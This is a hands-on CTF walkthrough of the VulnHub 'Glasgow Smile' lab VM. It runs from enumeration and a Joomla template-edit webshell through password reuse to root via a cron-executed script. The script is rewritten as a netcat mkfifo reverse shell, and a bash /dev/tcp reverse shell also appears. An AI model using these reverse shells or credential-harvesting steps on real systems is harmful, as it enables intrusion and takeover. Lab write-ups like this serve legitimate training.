# Ports Scan & Enumeration
## Ports Scan
```bash
┌──(htb㉿kali)-[~/Writeups/VulnHub/GlasgowSmile]
└─$ nmap -Pn -p- 192.168.59.188
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-11 12:33 AEST
Nmap scan report for 192.168.59.188
Host is up (0.0027s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.16 seconds

┌──(htb㉿kali)-[~/Writeups/VulnHub/GlasgowSmile]
└─$ nmap -Pn -p22,80 -A 192.168.59.188
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-11 12:34 AEST
Nmap scan report for 192.168.59.188
Host is up (0.00073s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 67:34:48:1f:25:0e:d7:b3:ea:bb:36:11:22:60:8f:a1 (RSA)
|   256 4c:8c:45:65:a4:84:e8:b1:50:77:77:a9:3a:96:06:31 (ECDSA)
|_  256 09:e9:94:23:60:97:f7:20:cc:ee:d6:c1:9b:da:18:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds
```

## WebService Enum
```bash
┌──(htb㉿kali)-[~/Writeups/VulnHub/GlasgowSmile]
└─$ nikto -host 192.168.59.188
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.59.188
+ Target Hostname:    192.168.59.188
+ Target Port:        80
+ Start Time:         2021-05-11 12:37:14 (GMT10)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 7d, size: 5a7fbb701d4b6, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2021-05-11 12:38:19 (GMT10) (65 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

┌──(htb㉿kali)-[~/Writeups/VulnHub/GlasgowSmile]
└─$ dirb http://192.168.59.188 -r

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue May 11 12:39:05 2021
URL_BASE: http://192.168.59.188/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.59.188/ ----
+ http://192.168.59.188/index.html (CODE:200|SIZE:125)
==> DIRECTORY: http://192.168.59.188/joomla/
+ http://192.168.59.188/server-status (CODE:403|SIZE:279)

-----------------
END_TIME: Tue May 11 12:39:16 2021
DOWNLOADED: 4612 - FOUND: 2

```
![](Pasted%20image%2020210511130255.png)
```bash
┌──(htb㉿kali)-[/usr/share/wordlists]
└─$ joomscan -u http://192.168.59.188/joomla/ -ec
    ____  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://192.168.59.188/joomla/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.3rc1

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing :
http://192.168.59.188/joomla/administrator/components
http://192.168.59.188/joomla/administrator/modules
http://192.168.59.188/joomla/administrator/templates
http://192.168.59.188/joomla/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://192.168.59.188/joomla/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://192.168.59.188/joomla/robots.txt

Interesting path found from robots.txt
http://192.168.59.188/joomla/joomla/administrator/
http://192.168.59.188/joomla/administrator/
http://192.168.59.188/joomla/bin/
http://192.168.59.188/joomla/cache/
http://192.168.59.188/joomla/cli/
http://192.168.59.188/joomla/components/
http://192.168.59.188/joomla/includes/
http://192.168.59.188/joomla/installation/
http://192.168.59.188/joomla/language/
http://192.168.59.188/joomla/layouts/
http://192.168.59.188/joomla/libraries/
http://192.168.59.188/joomla/logs/
http://192.168.59.188/joomla/modules/
http://192.168.59.188/joomla/plugins/
http://192.168.59.188/joomla/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found

[+] Enumeration component (com_ajax)
[++] Name: com_ajax
Location : http://192.168.59.188/joomla/components/com_ajax/
Directory listing is enabled : http://192.168.59.188/joomla/components/com_ajax/


[+] Enumeration component (com_banners)
[++] Name: com_banners
Location : http://192.168.59.188/joomla/components/com_banners/
Directory listing is enabled : http://192.168.59.188/joomla/components/com_banners/


[+] Enumeration component (com_contact)
[++] Name: com_contact
Location : http://192.168.59.188/joomla/components/com_contact/
Directory listing is enabled : http://192.168.59.188/joomla/components/com_contact/


[+] Enumeration component (com_content)
[++] Name: com_content
Location : http://192.168.59.188/joomla/components/com_content/
Directory listing is enabled : http://192.168.59.188/joomla/components/com_content/


[+] Enumeration component (com_contenthistory)
[++] Name: com_contenthistory
Location : http://192.168.59.188/joomla/components/com_contenthistory/
Directory listing is enabled : http://192.168.59.188/joomla/components/com_contenthistory/


[+] Enumeration component (com_fields)
[++] Name: com_fields
Location : http://192.168.59.188/joomla/components/com_fields/
Directory listing is enabled : http://192.168.59.188/joomla/components/com_fields/


[+] Enumeration component (com_finder)
[++] Name: com_finder
Location : http://192.168.59.188/joomla/components/com_finder/
Directory listing is enabled : http://192.168.59.188/joomla/components/com_finder/


[+] Enumeration component (com_mailto)
[++] Name: com_mailto
Location : http://192.168.59.188/joomla/components/com_mailto/
Directory listing is enabled : http://192.168.59.188/joomla/components/com_mailto/
Installed version : 3.1


[+] Enumeration component (com_media)
[++] Name: com_media
Location : http://192.168.59.188/joomla/components/com_media/
Directory listing is enabled : http://192.168.59.188/joomla/components/com_media/


[+] Enumeration component (com_newsfeeds)
[++] Name: com_newsfeeds
Location : http://192.168.59.188/joomla/components/com_newsfeeds/
Directory listing is enabled : http://192.168.59.188/joomla/components/com_newsfeeds/


[+] Enumeration component (com_search)
[++] Name: com_search
Location : http://192.168.59.188/joomla/components/com_search/
Directory listing is enabled : http://192.168.59.188/joomla/components/com_search/


[+] Enumeration component (com_users)
[++] Name: com_users
Location : http://192.168.59.188/joomla/components/com_users/
Directory listing is enabled : http://192.168.59.188/joomla/components/com_users/


[+] Enumeration component (com_wrapper)
[++] Name: com_wrapper
Location : http://192.168.59.188/joomla/components/com_wrapper/
Directory listing is enabled : http://192.168.59.188/joomla/components/com_wrapper/
Installed version : 3.1



Your Report : reports/192.168.59.188/
```

![](Pasted%20image%2020210511131421.png)

- Here's the only thing not make sense of this box is it use `joomla` as the login username of Joomla CMS. Tried admin/admin, joomla/joomla, admin/password, joomla/password, none of them worked.
- And then bruteforcing the password, but have to try it on different username, which really consuming time.......
![](Pasted%20image%2020210517181523.png)
```console
┌──(htb㉿kali)-[/tmp]
└─$ cewl http://192.168.59.188/joomla/ -w glasgow.txt
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```
- And somehow the intruder response is not that solid, I tried at least 4 times to get the result.......
![](Pasted%20image%2020210517183804.png)
- Then we can login.
![](Pasted%20image%2020210517184630.png)
- Reverse shell should be very easy to get from template editing:
![](Pasted%20image%2020210517184936.png)
- New a file, but can't access it from web browser anywhere, always say 404:
![](Pasted%20image%2020210519131506.png)
- So have to add new line into index.php
![](Pasted%20image%2020210519131631.png)
![](Pasted%20image%2020210519132016.png)
```console
└─$ nc -lvnp 9001
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001

Ncat: Connection from 192.168.59.188.
Ncat: Connection from 192.168.59.188:48824.
/bin/sh: 0: can't access tty; job control turned off
$ $ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@glasgowsmile:/var/www/html/joomla$ ^Z
[1]+  Stopped                 nc -lvnp 9001
┌──(htb㉿kali)-[/]
└─$ stty raw -echo
nc -lvnp 9001

www-data@glasgowsmile:/var/www/html/joomla$ stty rows 96 cols 116
www-data@glasgowsmile:/var/www/html/joomla$ export TERM=xterm
www-data@glasgowsmile:/var/www/html/joomla$ ls
LICENSE.txt    bin    components         images     language   media    robots.txt  web.config.txt
README.txt     cache  configuration.php  includes   layouts    modules  templates
administrator  cli    htaccess.txt       index.php  libraries  plugins  tmp
www-data@glasgowsmile:/var/www/html/joomla$ cd /home
www-data@glasgowsmile:/home$ ls -al
total 20
drwxr-xr-x  5 root    root    4096 Jun 15  2020 .
drwxr-xr-x 18 root    root    4096 Jun 13  2020 ..
drwxr-xr-x  4 abner   abner   4096 Jun 16  2020 abner
drwxr-xr-x  5 penguin penguin 4096 Jun 16  2020 penguin
drwxr-xr-x  3 rob     rob     4096 Jun 16  2020 rob
www-data@glasgowsmile:/home$

www-data@glasgowsmile:/home$ find . -ls
   655372      4 drwxr-xr-x   5 root     root         4096 Jun 15  2020 .
   655361      4 drwxr-xr-x   3 rob      rob          4096 Jun 16  2020 ./rob
   655391      4 -rw-r--r--   1 rob      rob            66 Jun 15  2020 ./rob/.selected_editor
   655380      4 -rw-r-----   1 rob      rob            38 Jun 13  2020 ./rob/user.txt
   655366      4 -rw-------   1 rob      rob             7 May 17 19:33 ./rob/.bash_history
   655389      4 -rw-r-----   1 rob      rob           313 Jun 14  2020 ./rob/howtoberoot
   655393      4 -rw-------   1 rob      rob            81 Jun 15  2020 ./rob/.mysql_history
   655362      4 -rw-r--r--   1 rob      rob          3526 Jun 13  2020 ./rob/.bashrc
   655410      4 -rw-------   1 rob      rob           429 Jun 16  2020 ./rob/.Xauthority
   655363      4 -rw-r--r--   1 rob      rob           220 Jun 13  2020 ./rob/.bash_logout
   655364      4 -rw-r--r--   1 rob      rob           807 Jun 13  2020 ./rob/.profile
   655388      4 -rw-r-----   1 rob      rob           454 Jun 14  2020 ./rob/Abnerineedyourhelp
   655376      4 drwxr-xr-x   3 rob      rob          4096 Jun 13  2020 ./rob/.local
   655377      4 drwx------   3 rob      rob          4096 Jun 13  2020 ./rob/.local/share
find: './rob/.local/share': Permission denied
   655379      4 drwxr-xr-x   4 abner    abner        4096 Jun 16  2020 ./abner
   655406      4 -rw-r-----   1 abner    abner          38 Jun 16  2020 ./abner/user2.txt
   655386      4 -rw-------   1 abner    abner         167 May 17 19:33 ./abner/.bash_history
   655382      4 -rw-r--r--   1 abner    abner        3526 Jun 14  2020 ./abner/.bashrc
   655403      4 -rw-------   1 abner    abner         399 Jun 15  2020 ./abner/.Xauthority
   655369      4 -rw-r-----   1 abner    abner         565 Jun 16  2020 ./abner/info.txt
   655383      4 -rw-r--r--   1 abner    abner         220 Jun 14  2020 ./abner/.bash_logout
   655385      4 -rw-r--r--   1 abner    abner         807 Jun 14  2020 ./abner/.profile
   655400      4 drwx------   2 abner    abner        4096 Jun 15  2020 ./abner/.ssh
find: './abner/.ssh': Permission denied
   655387      4 drwxr-xr-x   3 abner    abner        4096 Jun 14  2020 ./abner/.local
   655390      4 drwx------   3 abner    abner        4096 Jun 14  2020 ./abner/.local/share
find: './abner/.local/share': Permission denied
   655371      4 drwxr-xr-x   5 penguin  penguin      4096 Jun 16  2020 ./penguin
   655402      4 -rw-------   1 penguin  penguin         7 May 17 19:33 ./penguin/.bash_history
   655397      4 -rw-r--r--   1 penguin  penguin      3526 Jun 15  2020 ./penguin/.bashrc
   655408      4 -rw-------   1 penguin  penguin        58 Jun 15  2020 ./penguin/.Xauthority
   655399      4 -rw-r--r--   1 penguin  penguin       220 Jun 15  2020 ./penguin/.bash_logout
   655401      4 -rw-r--r--   1 penguin  penguin       807 Jun 15  2020 ./penguin/.profile
   655404      4 drwxr--r--   2 penguin  penguin      4096 Jun 16  2020 ./penguin/SomeoneWhoHidesBehindAMask
find: './penguin/SomeoneWhoHidesBehindAMask/user3.txt': Permission denied
find: './penguin/SomeoneWhoHidesBehindAMask/find': Permission denied
find: './penguin/SomeoneWhoHidesBehindAMask/PeopleAreStartingToNotice.txt': Permission denied
find: './penguin/SomeoneWhoHidesBehindAMask/.trash_old': Permission denied
   655394      4 drwx------   2 penguin  penguin      4096 Jun 15  2020 ./penguin/.ssh
find: './penguin/.ssh': Permission denied
   655395      4 drwxr-xr-x   3 penguin  penguin      4096 Jun 15  2020 ./penguin/.local
   655396      4 drwx------   3 penguin  penguin      4096 Jun 15  2020 ./penguin/.local/share
find: './penguin/.local/share': Permission denied
```

- So we know the privesc sequence is rob > abner > penguin
```console
www-data@glasgowsmile:/home$ cd rob
www-data@glasgowsmile:/home/rob$ cat user.txt
cat: user.txt: Permission denied
www-data@glasgowsmile:/home/rob$ su rob
Password:
su: Authentication failure
www-data@glasgowsmile:/home/rob$ cd /var/www/html
www-data@glasgowsmile:/var/www/html$ ls
how_to.txt  index.html  joker.jpg  joomla
www-data@glasgowsmile:/var/www/html$ cat how_to.txt

Hi Rob,
Forgive My Laughter. I Have A Condition

Take care


  ________     ____      __   ___    _____   ______
 (___  ___)   / __ \    () ) / __)  / ___/  (   __ \
     ) )     / /  \ \   ( (_/ /    ( (__     ) (__) )
    ( (     ( ()  () )  ()   (      ) __)   (    __/
 __  ) )    ( ()  () )  () /\ \    ( (       ) \ \  _
( (_/ /      \ \__/ /   ( (  \ \    \ \___  ( ( \ \_))
 \___/        \____/    ()_)  \_\    \____\  )_) \__/

```

- run linpeas.sh
```console
[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rwxr-xr-x 1 abner abner 516 Jun 16  2020 /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
```

- tried to crack it by fcrackzip or john, but not work, so maybe it's good idea to keep it for now.
- I know mysqld is run by user mysql, but since we don't have anything now, no harm to check on it.
```console
www-data@glasgowsmile:/var/www/html/joomla$ grep -n5 password configuration.php
12-     public $debug = '0';
13-     public $debug_lang = '0';
14-     public $dbtype = 'mysqli';
15-     public $host = 'localhost';
16-     public $user = 'joomla';
17:     public $password = 'babyjoker';
18-     public $db = 'joomla_db';
19-     public $dbprefix = 'jnqcu_';
20-     public $live_site = '';
21-     public $secret = 'fNRyp6KO51013435';
22-     public $gzip = '0';

www-data@glasgowsmile:/var/www/html/joomla$ mysql -u joomla -pbabyjoker -h localhost
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 299
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| batjoke            |
| information_schema |
| joomla_db          |
| mysql              |
| performance_schema |
+--------------------+
5 rows in set (0.004 sec)
```

- Here's an interesting DB called batjoke, which is not related to anything we know so far, should check that.
```console
MariaDB [(none)]> use batjoke;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [batjoke]> show tables;
+-------------------+
| Tables_in_batjoke |
+-------------------+
| equipment         |
| taskforce         |
+-------------------+
2 rows in set (0.000 sec)

MariaDB [batjoke]> describe equipment;
+--------------+--------------+------+-----+---------+----------------+
| Field        | Type         | Null | Key | Default | Extra          |
+--------------+--------------+------+-----+---------+----------------+
| equip_id     | int(5)       | NO   | PRI | NULL    | auto_increment |
| type         | varchar(50)  | YES  |     | NULL    |                |
| install_date | date         | YES  |     | NULL    |                |
| color        | varchar(20)  | YES  |     | NULL    |                |
| working      | tinyint(1)   | YES  |     | NULL    |                |
| location     | varchar(250) | YES  |     | NULL    |                |
+--------------+--------------+------+-----+---------+----------------+
6 rows in set (0.001 sec)

MariaDB [batjoke]> describe taskforce;
+-------+--------------+------+-----+---------+----------------+
| Field | Type         | Null | Key | Default | Extra          |
+-------+--------------+------+-----+---------+----------------+
| id    | int(5)       | NO   | PRI | NULL    | auto_increment |
| type  | varchar(50)  | YES  |     | NULL    |                |
| date  | date         | YES  |     | NULL    |                |
| name  | varchar(20)  | YES  |     | NULL    |                |
| pswd  | varchar(250) | YES  |     | NULL    |                |
+-------+--------------+------+-----+---------+----------------+
5 rows in set (0.001 sec)

MariaDB [batjoke]> select name,pswd from taskforce;
+---------+----------------------------------------------+
| name    | pswd                                         |
+---------+----------------------------------------------+
| Bane    | YmFuZWlzaGVyZQ==                             |
| Aaron   | YWFyb25pc2hlcmU=                             |
| Carnage | Y2FybmFnZWlzaGVyZQ==                         |
| buster  | YnVzdGVyaXNoZXJlZmY=                         |
| rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
| aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
+---------+----------------------------------------------+
6 rows in set (0.001 sec)
```

- base64 password cracked
`
+---------+----------------------------------------------+
| Bane    | baneishere                                   |
| Aaron   | aaronishere                                  |
| Carnage | carnageishere                                |
| buster  | busterishereff                               |
| rob     | ???AllIHaveAreNegativeThoughts???            |
| aunt    | auntis the fuck here                         |
+---------+----------------------------------------------+
`
- But only one username is same as login user, rob. And yes, we get in.
```console
www-data@glasgowsmile:/var/www/html/joomla$ su rob
Password:
rob@glasgowsmile:~$ ls
Abnerineedyourhelp  howtoberoot  user.txt
rob@glasgowsmile:~$ cat *
Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
  _____ ______   __  _   _    _    ____  ____  _____ ____
 |_   _|  _ \ \ / / | | | |  / \  |  _ \|  _ \| ____|  _ \
   | | | |_) \ V /  | |_| | / _ \ | |_) | | | |  _| | |_) |
   | | |  _ < | |   |  _  |/ ___ \|  _ <| |_| | |___|  _ <
   |_| |_| \_\|_|   |_| |_/_/   \_\_| \_\____/|_____|_| \_\

NO HINTS.


JKR[f5bb11acbb957915e421d62e7253d27a]
```
- looks like rot code is it? It's ROT27
![](Pasted%20image%2020210519165242.png)
- And now we have the correct base64 code.
```console
rob@glasgowsmile:~$ echo STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA== | base64 -d
I33hope99my0death000makes44more8cents00than0my0life0
```
- This password is good to switch user to abner
```console
rob@glasgowsmile:~$ su abner
Password:
abner@glasgowsmile:/home/rob$  cat *
A Glasgow smile is a wound caused by making a cut from the corners of a victim's mouth up to the ears, leaving a scar in the shape of a smile.
The act is usually performed with a utility knife or a piece of broken glass, leaving a scar which causes the victim to appear to be smiling broadly.
The practice is said to have originated in Glasgow, Scotland in the 1920s and 30s. The attack became popular with English street gangs (especially among the Chelsea Headhunters, a London-based hooligan firm, among whom it is known as a "Chelsea grin" or "Chelsea smile").
JKR{0286c47edc9bfdaf643f5976a8cfbd8d}
```
- Nothing useful, but next user is penguin, so the password protected .dear_penguins.zip must be useful here, and tried by john and fcrack with the joomla and info.txt created wordlist, none of them working, so it's no harm to try all the passwords we have had right now, and abner's password worked:
```console
┌──(htb㉿kali)-[/tmp]
└─$ unzip dear_penguins.zip                                                                                    82 ⨯
Archive:  dear_penguins.zip
[dear_penguins.zip] dear_penguins password:
  inflating: dear_penguins
  
┌──(htb㉿kali)-[/tmp]
└─$ cat dear_penguins
My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz

abner@glasgowsmile:/tmp$ su penguin
Password:
penguin@glasgowsmile:/tmp$ cd ~
penguin@glasgowsmile:~$ ls
SomeoneWhoHidesBehindAMask
penguin@glasgowsmile:~$ cd SomeoneWhoHidesBehindAMask/
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls
find  PeopleAreStartingToNotice.txt  user3.txt
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -al
total 332
drwxr--r-- 2 penguin penguin   4096 Jun 16  2020 .
drwxr-xr-x 5 penguin penguin   4096 Jun 16  2020 ..
-rwSr----- 1 penguin penguin 315904 Jun 15  2020 find
-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
-rwxr-xr-x 1 penguin root       612 Jun 16  2020 .trash_old
-rw-r----- 1 penguin penguin     38 Jun 16  2020 user3.txt
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat *.txt
Hey Penguin,
I'm writing software, I can't make it work because of a permissions issue. It only runs with root permissions. When it's complete I'll copy it to this folder.

Joker

  _____    _____      __      _   __   ________       _____   ________      ______     _____     ____     __    __   ________    _____   _________   __    __   _____       ______
 (_   _)  / ____\    /  \    / ) (  ) (___  ___)     (_   _) (___  ___)    (_   _ \   / ___/    (    )    ) )  ( (  (___  ___)  (_   _) (_   _____)  ) )  ( (  (_   _)     (_____ \
   | |   ( (___     / /\ \  / /   \/      ) )          | |       ) )         ) (_) ) ( (__      / /\ \   ( (    ) )     ) )       | |     ) (___    ( (    ) )   | |          ___) )
   | |    \___ \    ) ) ) ) ) )          ( (           | |      ( (          \   _/   ) __)    ( (__) )   ) )  ( (     ( (        | |    (   ___)    ) )  ( (    | |         (  __/
   | |        ) )  ( ( ( ( ( (            ) )          | |       ) )         /  _ \  ( (        )    (   ( (    ) )     ) )       | |     ) (       ( (    ) )   | |   __     )_)
  _| |__  ___/ /   / /  \ \/ /           ( (          _| |__    ( (         _) (_) )  \ \___   /  /\  \   ) \__/ (     ( (       _| |__  (   )       ) \__/ (  __| |___) )    __
 /_____( /____/   (_/    \__/            /__\        /_____(    /__\       (______/    \____\ /__(  )__\  \______/     /__\     /_____(   \_/        \______/  \________/    (__)



JKR{284a3753ec11a592ee34098b8cb43d52}
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ file find
find: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=77494c30a19019ecb995eeb74250aa57c073c635, stripped
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ./find
bash: ./find: Permission denied
```
- Because of the capital suid means there's no x permission for the owner, so this file can't be execute....
- And both find is very same file.......
```console
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ which find
/usr/bin/find
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ md5sum
^C
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ md5sum ./find
55f2c4933d6f5a7e81d0a023281d1e62  ./find
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ md5sum /usr/bin/find
55f2c4933d6f5a7e81d0a023281d1e62  /usr/bin/find
```

- So probably this find is useless to me....Check by pspy
```console
penguin@glasgowsmile:/etc$ cd /tmp
penguin@glasgowsmile:/tmp$ wget http://192.168.59.60:8000/pspy64
--2021-05-19 20:20:48--  http://192.168.59.60:8000/pspy64
Connecting to 192.168.59.60:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                       100%[==============================================>]   2.94M  19.0MB/s    in 0.2s

2021-05-19 20:20:48 (19.0 MB/s) - ‘pspy64’ saved [3078592/3078592]

penguin@glasgowsmile:/tmp$ chmod +x pspy64
penguin@glasgowsmile:/tmp$ ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2021/05/19 20:20:55 CMD: UID=0    PID=9919   |
...[snip]...
2021/05/19 20:21:01 CMD: UID=0    PID=37594  | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old
^CExiting program... (interrupt)
```

- Interesting, this is why .trash_old is executable, and own by group root. It's run by cron as root (uid=0)
```console
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ^C
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat .trash_old
bash -i >& /dev/tcp/192.168.59.60/9002 0>&1
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ bash -i >& /dev/tcp/192.168.59.60/9002 0>&1
^C^C^Cpenguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old
/home/penguin/SomeoneWhoHidesBehindAMask/.trash_old: 2: /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old: Syntax error: Bad fd number
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ echo $SHELL
/bin/bash
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1^C00
2 >/tmp/f'
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ nc
Cmd line: ^C
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old^C
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.59.60 9002 >/tmp/f' > .trash_old
```
- I changed .trash_old, by the command `bash -i...`, but when execute it, I got `bad fd number` error due to this script is executed by /bin/sh, not /bin/bash, and there's a symbol `>&` is not supported by /bin/sh. So I have to change it. Then I have the shell.
```console
┌──(htb㉿kali)-[/opt/pspy]
└─$ nc -lvnp 9002
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9002
Ncat: Listening on 0.0.0.0:9002
Ncat: Connection from 192.168.59.188.
Ncat: Connection from 192.168.59.188:38752.
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls -al
total 48
drwx------  3 root root 4096 Jun 16  2020 .
drwxr-xr-x 18 root root 4096 Jun 13  2020 ..
-rw-------  1 root root    7 May 17 19:33 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rwxr-x--x  1 root root  867 Jun 16  2020 .clean.sh
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-------  1 root root 3862 Jun 15  2020 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r-----  1 root root 1863 Jun 14  2020 root.txt
-rw-r--r--  1 root root   66 Jun 13  2020 .selected_editor
-rw-r--r--  1 root root  165 Jun 13  2020 .wget-hsts
-rw-r--r--  1 root root   24 Jun 16  2020 whoami
# cat root.txt
  ▄████ ██▓   ▄▄▄       ██████  ▄████ ▒█████  █     █░     ██████ ███▄ ▄███▓██▓██▓   ▓█████
